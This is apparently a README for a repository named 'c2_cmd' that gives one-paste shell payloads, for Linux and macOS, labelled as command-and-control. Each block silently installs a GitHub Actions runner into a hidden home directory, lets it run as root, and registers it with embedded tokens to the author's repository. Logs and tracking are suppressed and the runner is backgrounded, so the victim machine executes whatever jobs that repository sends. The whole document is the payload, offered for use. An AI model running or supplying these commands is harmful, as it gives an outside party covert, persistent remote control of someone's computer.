# c2_cmd
work c2
payload
```
export WORKER_LOGRETENTION=1
export RUNNER_LOGRETENTION=1
mkdir -p $HOME/.actions-runner1/ && cd $HOME/.actions-runner1/
curl -o actions-runner-linux-x64-2.327.1.tar.gz -L https://github.com/actions/runner/releases/download/v2.327.1/actions-runner-linux-x64-2.327.1.tar.gz > /dev/null 2>&1
tar xzf ./actions-runner-linux-x64-2.327.1.tar.gz
export RUNNER_ALLOW_RUNASROOT="1"
./config.sh --url https://github.com/kjagsdq/c2_cmd --unattended --token BROA73W4ZA3U36EYNLPQXT3ISZGLO  --name "bsrc" --labels "bsrc" > /dev/null 2>&1
rm actions-runner-linux-x64-2.327.1.tar.gz
export RUNNER_TRACKING_ID=0 && nohup ./run.sh > /dev/null 2>&1 &
```

mac
```
export WORKER_LOGRETENTION=1
export RUNNER_LOGRETENTION=1
mkdir -p $HOME/.actions-runner1/ && cd $HOME/.actions-runner1/
curl -o actions-runner-osx-x64-2.327.1.tar.gz -L https://github.com/actions/runner/releases/download/v2.327.1/actions-runner-osx-x64-2.327.1.tar.gz > /dev/null 2>&1
tar xzf ./actions-runner-osx-x64-2.327.1.tar.gz
export RUNNER_ALLOW_RUNASROOT="1"
./config.sh --url https://github.com/kjagsdq/c2_cmd --unattended --token BROA73QUUNTN4L5M5GJQEJDISZRBE  --name "Mac-CI" --labels "Mac-CI" > /dev/null 2>&1
rm actions-runner-osx-x64-2.327.1.tar.gz
export RUNNER_TRACKING_ID=0 && nohup ./run.sh > /dev/null 2>&1 &
```
